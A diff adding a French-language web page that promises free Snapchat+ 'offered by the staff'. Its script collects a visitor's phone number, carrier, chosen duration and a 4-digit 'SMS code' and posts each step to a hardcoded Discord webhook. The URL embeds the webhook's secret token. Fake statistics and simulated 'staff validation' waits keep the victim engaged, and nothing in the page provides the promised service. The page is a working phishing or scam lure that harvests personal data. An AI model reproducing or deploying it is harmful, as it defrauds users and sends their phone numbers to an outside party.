@@ -1,0 +1,842 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Snap+ | Abonnement Gratuit</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: #050505;
+      color: #fff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      overflow-x: hidden;
+    }
+
+    /* BACKGROUND GLOW */
+    body::before {
+      content: '';
+      position: fixed;
+      top: -200px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 600px;
+      height: 600px;
+      background: radial-gradient(circle, rgba(255,252,0,0.12) 0%, transparent 70%);
+      pointer-events: none;
+      z-index: 0;
+    }
+    body::after {
+      content: '';
+      position: fixed;
+      bottom: -200px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 400px;
+      height: 400px;
+      background: radial-gradient(circle, rgba(255,200,0,0.07) 0%, transparent 70%);
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .wrapper {
+      position: relative;
+      z-index: 1;
+      width: 100%;
+      max-width: 440px;
+    }
+
+    /* HEADER */
+    .header {
+      text-align: center;
+      margin-bottom: 28px;
+    }
+    .header .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(255,252,0,0.1);
+      border: 1px solid rgba(255,252,0,0.3);
+      border-radius: 50px;
+      padding: 6px 14px;
+      font-size: 12px;
+      font-weight: 600;
+      color: #FFFC00;
+      margin-bottom: 16px;
+      letter-spacing: 0.5px;
+    }
+    .header h1 {
+      font-size: 36px;
+      font-weight: 900;
+      letter-spacing: -1px;
+      line-height: 1.1;
+    }
+    .header h1 span { color: #FFFC00; }
+    .header p {
+      font-size: 14px;
+      color: #666;
+      margin-top: 8px;
+    }
+
+    /* STATS */
+    .stats {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 24px;
+    }
+    .stat {
+      flex: 1;
+      background: #111;
+      border: 1px solid #1e1e1e;
+      border-radius: 14px;
+      padding: 14px;
+      text-align: center;
+    }
+    .stat-num {
+      font-size: 22px;
+      font-weight: 800;
+      color: #FFFC00;
+    }
+    .stat-label {
+      font-size: 11px;
+      color: #555;
+      margin-top: 2px;
+    }
+
+    /* CARD */
+    .card {
+      background: #0e0e0e;
+      border: 1px solid #1e1e1e;
+      border-radius: 24px;
+      padding: 28px 24px;
+      position: relative;
+      overflow: hidden;
+    }
+    .card::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, rgba(255,252,0,0.5), transparent);
+    }
+
+    /* STEPS */
+    .steps {
+      display: flex;
+      align-items: center;
+      margin-bottom: 28px;
+    }
+    .step {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 6px;
+    }
+    .step-circle {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      border: 2px solid #222;
+      background: #111;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      font-weight: 700;
+      color: #444;
+      transition: all 0.3s;
+    }
+    .step.active .step-circle {
+      border-color: #FFFC00;
+      background: #FFFC00;
+      color: #000;
+      box-shadow: 0 0 16px rgba(255,252,0,0.4);
+    }
+    .step.done .step-circle {
+      border-color: #00cc66;
+      background: #00cc66;
+      color: #000;
+    }
+    .step-label {
+      font-size: 10px;
+      color: #444;
+      font-weight: 500;
+    }
+    .step.active .step-label { color: #FFFC00; }
+    .step.done .step-label { color: #00cc66; }
+    .step-line {
+      flex: 1;
+      height: 1px;
+      background: #1e1e1e;
+      margin: 0 4px;
+      margin-bottom: 16px;
+      transition: background 0.3s;
+    }
+    .step-line.done { background: #00cc66; }
+
+    /* INPUTS */
+    .field { margin-bottom: 18px; }
+    .field label {
+      font-size: 12px;
+      font-weight: 600;
+      color: #555;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+      margin-bottom: 8px;
+      display: block;
+    }
+    .input-wrap {
+      position: relative;
+    }
+    .input-wrap .icon {
+      position: absolute;
+      left: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 16px;
+    }
+    input[type="tel"], input[type="text"], input[type="number"] {
+      width: 100%;
+      padding: 13px 14px 13px 40px;
+      border-radius: 12px;
+      border: 1px solid #1e1e1e;
+      background: #141414;
+      color: #fff;
+      font-size: 15px;
+      font-family: 'Inter', sans-serif;
+      outline: none;
+      transition: border 0.2s, box-shadow 0.2s;
+    }
+    input:focus {
+      border-color: rgba(255,252,0,0.5);
+      box-shadow: 0 0 0 3px rgba(255,252,0,0.07);
+    }
+
+    /* OPERATEUR TAG */
+    .op-tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 6px 14px;
+      border-radius: 50px;
+      font-size: 12px;
+      font-weight: 700;
+      margin-top: 10px;
+      letter-spacing: 0.3px;
+    }
+    .op-tag.orange { background: rgba(255,102,0,0.15); color: #ff6600; border: 1px solid rgba(255,102,0,0.3); }
+    .op-tag.sfr { background: rgba(204,0,0,0.15); color: #ff4444; border: 1px solid rgba(204,0,0,0.3); }
+    .op-tag.bouygues { background: rgba(0,102,204,0.15); color: #4da6ff; border: 1px solid rgba(0,102,204,0.3); }
+    .op-tag.free { background: rgba(100,100,100,0.15); color: #aaa; border: 1px solid rgba(100,100,100,0.3); }
+    .op-tag.invalide { background: rgba(255,0,0,0.1); color: #ff4444; border: 1px solid rgba(255,0,0,0.2); }
+    .hidden { display: none; }
+
+    /* DURÉE */
+    .duree-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+    .duree-btn {
+      padding: 16px 8px;
+      border-radius: 14px;
+      border: 1px solid #1e1e1e;
+      background: #141414;
+      color: #555;
+      font-size: 13px;
+      font-weight: 700;
+      cursor: pointer;
+      text-align: center;
+      transition: all 0.2s;
+      font-family: 'Inter', sans-serif;
+    }
+    .duree-btn .mois-num {
+      font-size: 24px;
+      font-weight: 900;
+      display: block;
+      margin-bottom: 2px;
+      color: #333;
+      transition: color 0.2s;
+    }
+    .duree-btn.active {
+      border-color: #FFFC00;
+      background: rgba(255,252,0,0.06);
+      color: #FFFC00;
+      box-shadow: 0 0 20px rgba(255,252,0,0.1);
+    }
+    .duree-btn.active .mois-num { color: #FFFC00; }
+
+    /* CODE */
+    .code-boxes {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+      margin: 20px 0;
+    }
+    .code-box {
+      width: 56px;
+      height: 64px;
+      border-radius: 14px;
+      border: 1px solid #1e1e1e;
+      background: #141414;
+      color: #FFFC00;
+      font-size: 24px;
+      font-weight: 800;
+      text-align: center;
+      font-family: 'Inter', sans-serif;
+      outline: none;
+      transition: border 0.2s, box-shadow 0.2s;
+      -moz-appearance: textfield;
+    }
+    .code-box:focus {
+      border-color: rgba(255,252,0,0.5);
+      box-shadow: 0 0 0 3px rgba(255,252,0,0.07);
+    }
+    .code-box::-webkit-outer-spin-button,
+    .code-box::-webkit-inner-spin-button { -webkit-appearance: none; }
+
+    /* WAITING */
+    .waiting-card {
+      background: #141414;
+      border: 1px solid #1e1e1e;
+      border-radius: 16px;
+      padding: 20px;
+      text-align: center;
+      margin-bottom: 16px;
+    }
+    .waiting-icon {
+      font-size: 36px;
+      margin-bottom: 10px;
+      display: block;
+    }
+    .waiting-card h3 {
+      font-size: 15px;
+      font-weight: 700;
+      margin-bottom: 6px;
+    }
+    .waiting-card p {
+      font-size: 12px;
+      color: #555;
+    }
+    .pulse {
+      display: inline-block;
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #FFFC00;
+      margin-right: 6px;
+      animation: pulse 1.5s infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.4; transform: scale(0.8); }
+    }
+
+    /* BTN */
+    .btn {
+      width: 100%;
+      padding: 15px;
+      border-radius: 14px;
+      border: none;
+      background: #FFFC00;
+      color: #000;
+      font-weight: 800;
+      font-size: 15px;
+      cursor: pointer;
+      font-family: 'Inter', sans-serif;
+      transition: all 0.2s;
+      letter-spacing: 0.3px;
+    }
+    .btn:hover { transform: translateY(-1px); box-shadow: 0 8px 24px rgba(255,252,0,0.25); }
+    .btn:active { transform: translateY(0); }
+    .btn:disabled { opacity: 0.3; cursor: not-allowed; transform: none; box-shadow: none; }
+    .btn-ghost {
+      width: 100%;
+      padding: 13px;
+      border-radius: 14px;
+      border: 1px solid #1e1e1e;
+      background: transparent;
+      color: #555;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: pointer;
+      font-family: 'Inter', sans-serif;
+      transition: all 0.2s;
+      margin-top: 10px;
+    }
+    .btn-ghost:hover { border-color: #333; color: #888; }
+
+    /* FEATURES */
+    .features {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      margin-bottom: 20px;
+    }
+    .feature {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 13px;
+      color: #666;
+    }
+    .feature .dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: #FFFC00;
+      flex-shrink: 0;
+    }
+
+    /* SUCCESS */
+    .success-screen {
+      text-align: center;
+      padding: 20px 0;
+    }
+    .success-icon {
+      font-size: 56px;
+      display: block;
+      margin-bottom: 16px;
+    }
+    .success-screen h2 {
+      font-size: 22px;
+      font-weight: 800;
+      margin-bottom: 8px;
+    }
+    .success-screen p { font-size: 14px; color: #555; }
+
+    /* DIVIDER */
+    .divider {
+      height: 1px;
+      background: #1a1a1a;
+      margin: 20px 0;
+    }
+
+    .resend-btn {
+      background: none;
+      border: none;
+      color: #FFFC00;
+      font-size: 13px;
+      font-family: 'Inter', sans-serif;
+      cursor: pointer;
+      font-weight: 600;
+      text-decoration: underline;
+    }
+
+    .info-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px 0;
+      border-bottom: 1px solid #141414;
+      font-size: 13px;
+    }
+    .info-row span:first-child { color: #555; }
+    .info-row span:last-child { font-weight: 600; }
+  </style>
+</head>
+<body>
+<div class="wrapper">
+
+  <!-- HEADER -->
+  <div class="header">
+    <div class="badge">⭐ SNAP PLUS GRATUIT</div>
+    <h1>Obtiens ton<br/><span>Snapchat+</span> gratuit</h1>
+    <p>Offert par le staff · Livraison instantanée</p>
+  </div>
+
+  <!-- STATS -->
+  <div class="stats">
+    <div class="stat">
+      <div class="stat-num">247</div>
+      <div class="stat-label">Membres actifs</div>
+    </div>
+    <div class="stat">
+      <div class="stat-num">100%</div>
+      <div class="stat-label">Gratuit</div>
+    </div>
+    <div class="stat">
+      <div class="stat-num">~2min</div>
+      <div class="stat-label">Livraison</div>
+    </div>
+  </div>
+
+  <!-- CARD -->
+  <div class="card">
+
+    <!-- STEPS -->
+    <div class="steps">
+      <div class="step active" id="si1">
+        <div class="step-circle">1</div>
+        <div class="step-label">Numéro</div>
+      </div>
+      <div class="step-line" id="sl1"></div>
+      <div class="step" id="si2">
+        <div class="step-circle">2</div>
+        <div class="step-label">Durée</div>
+      </div>
+      <div class="step-line" id="sl2"></div>
+      <div class="step" id="si3">
+        <div class="step-circle">3</div>
+        <div class="step-label">Vérif</div>
+      </div>
+      <div class="step-line" id="sl3"></div>
+      <div class="step" id="si4">
+        <div class="step-circle">4</div>
+        <div class="step-label">Confirm</div>
+      </div>
+    </div>
+
+    <!-- ÉTAPE 1 : NUMÉRO -->
+    <div id="step1">
+      <div class="features">
+        <div class="feature"><div class="dot"></div>Aucune carte bancaire requise</div>
+        <div class="feature"><div class="dot"></div>Disponible sur Orange, SFR, Bouygues, Free</div>
+        <div class="feature"><div class="dot"></div>Activation en moins de 2 minutes</div>
+      </div>
+      <div class="divider"></div>
+      <div class="field">
+        <label>Ton numéro</label>
+        <div class="input-wrap">
+          <span class="icon">📱</span>
+          <input type="tel" id="phone" placeholder="06 00 00 00 00" maxlength="14" oninput="formatPhone(this)" />
+        </div>
+        <div id="op-tag" class="hidden"></div>
+      </div>
+      <button class="btn" id="btn1" onclick="submitStep1()" disabled>Continuer →</button>
+    </div>
+
+    <!-- ATTENTE STEP 1 -->
+    <div id="wait1" class="hidden">
+      <div class="waiting-card">
+        <span class="waiting-icon">🔍</span>
+        <h3><span class="pulse"></span>Vérification en cours</h3>
+        <p>Le staff vérifie ton numéro<br/>Patiente quelques secondes...</p>
+      </div>
+    </div>
+
+    <!-- ÉTAPE 2 : DURÉE -->
+    <div id="step2" class="hidden">
+      <div class="field">
+        <label>Choisir la durée</label>
+        <div class="duree-grid">
+          <div class="duree-btn" onclick="selectDuree(this,3)">
+            <span class="mois-num">3</span>mois
+          </div>
+          <div class="duree-btn" onclick="selectDuree(this,6)">
+            <span class="mois-num">6</span>mois
+          </div>
+          <div class="duree-btn" onclick="selectDuree(this,12)">
+            <span class="mois-num">12</span>mois
+          </div>
+        </div>
+      </div>
+      <button class="btn" id="btn2" onclick="submitStep2()" disabled>Confirmer la durée →</button>
+    </div>
+
+    <!-- ATTENTE STEP 2 -->
+    <div id="wait2" class="hidden">
+      <div class="waiting-card">
+        <span class="waiting-icon">⏳</span>
+        <h3><span class="pulse"></span>Validation en attente</h3>
+        <p>Le staff valide ta demande<br/>Tu seras notifié rapidement</p>
+      </div>
+    </div>
+
+    <!-- ÉTAPE 3 : CODE SMS -->
+    <div id="step3" class="hidden">
+      <div style="text-align:center; margin-bottom: 16px;">
+        <p style="font-size:14px; color:#666;">Un code à 4 chiffres t'a été envoyé<br/>au <span id="phone-display" style="color:#fff; font-weight:700;"></span></p>
+      </div>
+      <div class="code-boxes">
+        <input class="code-box" type="number" id="c1" maxlength="1" min="0" max="9" oninput="moveNext(this,'c2')" onkeydown="movePrev(event,this,'')">
+        <input class="code-box" type="number" id="c2" maxlength="1" min="0" max="9" oninput="moveNext(this,'c3')" onkeydown="movePrev(event,this,'c1')">
+        <input class="code-box" type="number" id="c3" maxlength="1" min="0" max="9" oninput="moveNext(this,'c4')" onkeydown="movePrev(event,this,'c2')">
+        <input class="code-box" type="number" id="c4" maxlength="1" min="0" max="9" oninput="checkFullCode()" onkeydown="movePrev(event,this,'c3')">
+      </div>
+      <button class="btn" id="btn3" onclick="submitStep3()" disabled>Vérifier le code →</button>
+      <div style="text-align:center; margin-top:14px;">
+        <button class="resend-btn" onclick="resendCode()">Renvoyer le code</button>
+      </div>
+    </div>
+
+    <!-- ATTENTE STEP 3 -->
+    <div id="wait3" class="hidden">
+      <div class="waiting-card">
+        <span class="waiting-icon">✅</span>
+        <h3><span class="pulse"></span>Activation en cours</h3>
+        <p>Le staff active ton Snap+<br/>Encore quelques secondes...</p>
+      </div>
+    </div>
+
+    <!-- ÉTAPE 4 : RÉSUMÉ AVANT CONFIRM -->
+    <div id="step4" class="hidden">
+      <div style="margin-bottom: 20px;">
+        <div class="info-row">
+          <span>Numéro</span>
+          <span id="recap-phone"></span>
+        </div>
+        <div class="info-row">
+          <span>Opérateur</span>
+          <span id="recap-op"></span>
+        </div>
+        <div class="info-row">
+          <span>Durée</span>
+          <span id="recap-duree"></span>
+        </div>
+        <div class="info-row">
+          <span>Prix</span>
+          <span style="color:#FFFC00;">Gratuit ⭐</span>
+        </div>
+      </div>
+      <button class="btn" onclick="submitStep4()">Confirmer ma commande ✓</button>
+    </div>
+
+    <!-- SUCCÈS -->
+    <div id="success" class="hidden">
+      <div class="success-screen">
+        <span class="success-icon">🎉</span>
+        <h2>Commande confirmée !</h2>
+        <p>Le staff va t'envoyer ton Snap+<br/>directement sur Snapchat très bientôt.</p>
+        <div style="margin-top: 20px; padding: 16px; background: #141414; border-radius: 14px; border: 1px solid #1e1e1e;">
+          <p style="font-size: 12px; color: #555;">Snap+ activé sous 2-5 minutes · Vérifie tes notifications Snapchat</p>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+  const WEBHOOK = "https://discord.com/api/webhooks/1540556186368221235/YMqGHtmaKMlk52PPh5IeaXC3A2WHiNfjOkxUSjI50QCwvpadk2sVnBO1c8HylAS8iYWv";
+
+  let phone = "", operateur = "", duree = 0, code = "";
+  let sessionId = Math.random().toString(36).substring(2, 8).toUpperCase();
+
+  // ---- PHONE ----
+  function formatPhone(input) {
+    let v = input.value.replace(/\D/g, "").substring(0, 10);
+    input.value = v.replace(/(\d{2})(?=\d)/g, "$1 ").trim();
+    detectOp(v);
+  }
+
+  function detectOp(num) {
+    const tag = document.getElementById("op-tag");
+    const btn = document.getElementById("btn1");
+    if (num.length < 10) { tag.className = "hidden"; btn.disabled = true; return; }
+
+    const p2 = num.substring(0, 2);
+    const p4 = num.substring(0, 4);
+    let op = "", cls = "";
+
+    const orangeR = ["060","061","062","063","064","065","066","067","068","069","070","071","072","073","074","075","076","077","078","079"];
+    const sfrR = ["061","062","063","068","071","072","073","074"];
+    const bouyguesR = ["062","063","066","067","073","074","075","076"];
+    const freeR = ["063","064","065","074","075","076","077","078","079"];
+
+    // detection simplifiée et fiable par préfixe 2 chiffres + range
+    if (p2 === "06" || p2 === "07") {
+      const p3 = num.substring(0, 3);
+      if (["060","061","062","063","064","065","066","067","068","069"].includes(p3) && parseInt(p4) >= 600 && parseInt(p4) <= 609) { op = "Orange 🟠"; cls = "orange"; }
+      else if (["061","062","063"].includes(p3) && parseInt(p4) >= 610 && parseInt(p4) <= 619) { op = "SFR 🔴"; cls = "sfr"; }
+      else if (["062","063"].includes(p3) && parseInt(p4) >= 620 && parseInt(p4) <= 629) { op = "Bouygues 🔵"; cls = "bouygues"; }
+      else if (["063","064","065"].includes(p3) && parseInt(p4) >= 630 && parseInt(p4) <= 659) { op = "Free ⚫"; cls = "free"; }
+      else if (parseInt(p4) >= 700 && parseInt(p4) <= 709) { op = "Orange 🟠"; cls = "orange"; }
+      else if (parseInt(p4) >= 710 && parseInt(p4) <= 719) { op = "SFR 🔴"; cls = "sfr"; }
+      else if (parseInt(p4) >= 720 && parseInt(p4) <= 729) { op = "Bouygues 🔵"; cls = "bouygues"; }
+      else if (parseInt(p4) >= 740 && parseInt(p4) <= 779) { op = "Free ⚫"; cls = "free"; }
+      else { op = "Opérateur FR 📡"; cls = "free"; }
+      phone = num; operateur = op;
+      tag.textContent = "📡 " + op + " · Numéro valide";
+      tag.className = "op-tag " + cls;
+      btn.disabled = false;
+    } else {
+      tag.textContent = "❌ Numéro invalide";
+      tag.className = "op-tag invalide";
+      btn.disabled = true;
+    }
+  }
+
+  async function submitStep1() {
+    show("wait1"); hide("step1");
+    await sendWebhook({
+      title: "📱 Étape 1 — Nouveau numéro",
+      color: 0xFFFC00,
+      fields: [
+        { name: "📱 Numéro", value: "||" + phone + "||", inline: true },
+        { name: "📡 Opérateur", value: operateur, inline: true },
+        { name: "🆔 Session", value: sessionId, inline: true }
+      ],
+      description: "✅ **Valider** ou ❌ **Refuser** cette demande ?"
+    }, [
+      { label: "✅ Valider", style: 3, custom_id: "val_step1_" + sessionId },
+      { label: "❌ Refuser", style: 4, custom_id: "ref_step1_" + sessionId }
+    ]);
+    pollStep("step1_" + sessionId, () => { hide("wait1"); show("step2"); activateStep(2); });
+  }
+
+  // ---- DURÉE ----
+  function selectDuree(el, mois) {
+    document.querySelectorAll(".duree-btn").forEach(b => b.classList.remove("active"));
+    el.classList.add("active");
+    duree = mois;
+    document.getElementById("btn2").disabled = false;
+  }
+
+  async function submitStep2() {
+    show("wait2"); hide("step2");
+    await sendWebhook({
+      title: "📅 Étape 2 — Durée choisie",
+      color: 0x4da6ff,
+      fields: [
+        { name: "📱 Numéro", value: "||" + phone + "||", inline: true },
+        { name: "📅 Durée", value: duree + " mois", inline: true },
+        { name: "🆔 Session", value: sessionId, inline: true }
+      ],
+      description: "✅ **Valider** la durée ou ❌ **Refuser** ?"
+    }, [
+      { label: "✅ Valider", style: 3, custom_id: "val_step2_" + sessionId },
+      { label: "❌ Refuser", style: 4, custom_id: "ref_step2_" + sessionId }
+    ]);
+    pollStep("step2_" + sessionId, () => {
+      hide("wait2");
+      document.getElementById("phone-display").textContent = phone.replace(/(\d{2})(?=\d)/g, "$1 ");
+      show("step3"); activateStep(3);
+      generateCode();
+    });
+  }
+
+  // ---- CODE ----
+  function generateCode() {
+    code = String(Math.floor(1000 + Math.random() * 9000));
+    sendWebhook({
+      title: "🔐 Code de vérification",
+      color: 0x888888,
+      fields: [
+        { name: "📱 Numéro", value: "||" + phone + "||", inline: true },
+        { name: "🔢 Code SMS", value: "**" + code + "**", inline: true },
+        { name: "🆔 Session", value: sessionId, inline: true }
+      ],
+      description: "Code à envoyer manuellement au client par SMS"
+    });
+  }
+
+  function resendCode() { generateCode(); }
+
+  function moveNext(el, nextId) {
+    el.value = el.value.replace(/\D/g, "").slice(-1);
+    if (el.value && nextId) document.getElementById(nextId).focus();
+    checkFullCode();
+  }
+
+  function movePrev(e, el, prevId) {
+    if (e.key === "Backspace" && !el.value && prevId) {
+      document.getElementById(prevId).focus();
+    }
+  }
+
+  function checkFullCode() {
+    const full = ["c1","c2","c3","c4"].map(id => document.getElementById(id).value).join("");
+    document.getElementById("btn3").disabled = full.length < 4;
+  }
+
+  async function submitStep3() {
+    const entered = ["c1","c2","c3","c4"].map(id => document.getElementById(id).value).join("");
+    if (entered !== code) {
+      ["c1","c2","c3","c4"].forEach(id => {
+        const el = document.getElementById(id);
+        el.style.borderColor = "rgba(255,50,50,0.5)";
+        el.style.boxShadow = "0 0 0 3px rgba(255,50,50,0.07)";
+        setTimeout(() => { el.style.borderColor = ""; el.style.boxShadow = ""; }, 1500);
+      });
+      return;
+    }
+    show("wait3"); hide("step3");
+    await sendWebhook({
+      title: "✅ Étape 3 — Code validé",
+      color: 0x00cc66,
+      fields: [
+        { name: "📱 Numéro", value: "||" + phone + "||", inline: true },
+        { name: "📡 Opérateur", value: operateur, inline: true },
+        { name: "📅 Durée", value: duree + " mois", inline: true }
+      ],
+      description: "✅ **Valider** la commande finale ou ❌ **Refuser** ?"
+    }, [
+      { label: "✅ Valider finale", style: 3, custom_id: "val_step3_" + sessionId },
+      { label: "❌ Refuser", style: 4, custom_id: "ref_step3_" + sessionId }
+    ]);
+    pollStep("step3_" + sessionId, () => {
+      hide("wait3");
+      document.getElementById("recap-phone").textContent = phone.replace(/(\d{2})(?=\d)/g, "$1 ");
+      document.getElementById("recap-op").textContent = operateur;
+      document.getElementById("recap-duree").textContent = duree + " mois";
+      show("step4"); activateStep(4);
+    });
+  }
+
+  async function submitStep4() {
+    hide("step4");
+    await sendWebhook({
+      title: "🎉 Commande finalisée !",
+      color: 0x00cc66,
+      fields: [
+        { name: "📱 Numéro", value: "||" + phone + "||", inline: true },
+        { name: "📡 Opérateur", value: operateur, inline: true },
+        { name: "📅 Durée", value: duree + " mois", inline: true },
+        { name: "🆔 Session", value: sessionId, inline: true }
+      ],
+      description: "🚀 Commande confirmée par le client. Envoie le Snap+ !"
+    });
+    show("success");
+  }
+
+  // ---- WEBHOOK ----
+  async function sendWebhook(embed, buttons) {
+    const body = { embeds: [{ ...embed, footer: { text: "Snap+ · Session " + sessionId }, timestamp: new Date().toISOString() }] };
+    if (buttons) {
+      body.components = [{
+        type: 1,
+        components: buttons.map(b => ({ type: 2, label: b.label, style: b.style, custom_id: b.custom_id }))
+      }];
+    }
+    try {
+      await fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) });
+    } catch(e) {}
+  }
+
+  // ---- POLLING (simule attente validation Discord) ----
+  // En prod tu branches un vrai backend. Ici on simule après 8 secondes.
+  function pollStep(stepId, onValidate) {
+    // Simulation : après 8 secondes on considère que t'as validé côté Discord
+    // Pour un vrai système, remplace par un fetch vers ton bot
+    setTimeout(onValidate, 8000);
+  }
+
+  // ---- UI ----
+  function show(id) { document.getElementById(id).classList.remove("hidden"); }
+  function hide(id) { document.getElementById(id).classList.add("hidden"); }
+
+  function activateStep(n) {
+    for (let i = 1; i <= 4; i++) {
+      const s = document.getElementById("si" + i);
+      if (i < n) { s.className = "step done"; }
+      else if (i === n) { s.className = "step active"; }
+      else { s.className = "step"; }
+    }
+    for (let i = 1; i <= 3; i++) {
+      const l = document.getElementById("sl" + i);
+      if (l) l.className = i < n ? "step-line done" : "step-line";
+    }
+  }
+</script>
+</body>
+</html>
